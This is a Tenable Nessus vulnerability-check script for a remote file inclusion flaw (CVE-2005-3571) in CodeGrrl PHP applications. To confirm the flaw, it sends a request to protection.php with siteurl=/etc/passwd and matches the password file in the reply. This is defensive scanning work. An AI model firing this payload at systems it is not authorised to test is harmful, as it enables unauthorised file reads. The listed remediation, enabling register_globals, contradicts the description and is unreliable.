#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20214);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2005-3571");
  script_bugtraq_id(15417);
  script_osvdb_id(20816);

  script_name(english:"CodeGrrl Applications Remote File Inclusion Vulnerabilities");
  script_summary(english:"Checks for remote file inclusion vulnerabilities in CodeGrrl applications");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
remote file inclusion vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running at least one of the PHP
applications from CodeGrrl - PHPCalendar, PHPClique, PHPFanBase, or
PHPQuotes.  Under certain conditions, these applications fail to
sanitize input to the 'siteurl' parameter of the 'protection.php'
script before using it in a PHP 'include' function.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker can
exploit this issue to view arbitrary files on the remote host and to
execute arbitrary PHP code, possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/416525/30/30/threaded" );
 script_set_attribute(attribute:"solution", value:
"Enable PHP's 'register_globals' setting." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:W/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/11/16");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/11/13");
 script_cvs_date("$Date: 2011/03/14 21:48:02 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/currently", "/calendar", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read the password file.
  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/protection.php?",
      "action=logout&",
      "siteurl=/etc/passwd"));
  if (isnull(r)) exit(0);
  res = r[2];
  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
    if (report_verbosity > 0) {
      report = string(
        "\n",
        res
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
